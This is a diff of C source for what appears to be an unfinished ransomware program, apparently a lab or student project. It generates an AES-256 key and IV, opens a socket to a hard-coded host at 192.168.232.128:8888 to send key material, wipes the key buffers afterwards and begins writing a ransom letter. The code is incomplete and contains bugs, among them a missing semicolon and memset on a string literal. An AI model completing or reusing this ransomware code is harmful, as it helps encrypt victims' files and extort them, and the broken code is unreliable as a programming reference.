@@ -9,7 +9,7 @@
 // for isFile()
 #include <sys/types.h> //isFile()
 #include <errno.h>
-//ransomlib.h réécrit
+//ransomlib.h rewrite
 #define SIZEKEY AES_256_KEY_SIZE
 #define SIZEIV AES_BLOCK_SIZE
 
@@ -89,18 +89,6 @@ int isFile(const char* name)
     return -1;
 }
 
-int main(void) {
-
-
-
-
-
-
-
-
-
-}
-
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv){
     if(RAND_bytes(key, sizeKey) == 0) {
         test(key,sizeKey);
@@ -114,6 +102,7 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 
 int send_key(char *pKey, char *pIv)
 {
+    //Create Socket
     int sockid;
     int server_port = 8888;
     char *server_ip = "192.168.232.128";
@@ -125,11 +114,17 @@ int send_key(char *pKey, char *pIv)
     server_addr.sin_port = htons(server_port);
     server_addr.sin_addr.s_addr = inet_addr(server_ip);
 
+    //Message
     char *msg = "hello";
 
     connect(sockid,(struct sockaddr *)&server_addr,sizeof(server_addr));
 
     send(sockid, (const char *)msg, strlen(msg),0)
+
+    //Delete Message
+    memset(msg, 0, sizeof(char));
+    memset(pKey, 0, sizeof(char));
+    memset(pIv, 0, sizeof(char));
 
     close(sockid);
 
@@ -138,13 +133,18 @@ int send_key(char *pKey, char *pIv)
 int main (int argc, char * argv[])
 {
 
-
+    key = (unsigned char*)calloc(SIZEKEY+1,sizeof(unsigned char));
+    iv = (unsigned char*)calloc(SIZEIV+1,sizeof(unsigned char));
+    pKey = (char*)calloc((SIZEKEY*2)+1,sizeof(unsigned char));
+    pIv = (char*)calloc((SIZEIV*2)+1,sizeof(unsigned char));
 
 
     //Get Arguments
+    if (argc > 1) {
 
-
-
+    }
+    generate_key(key,SIZEKEY,iv,SIZEIV,pKey,pIv);
+    //Free memory
 
         //Ransom Letter
         FILE* fichier = NULL;
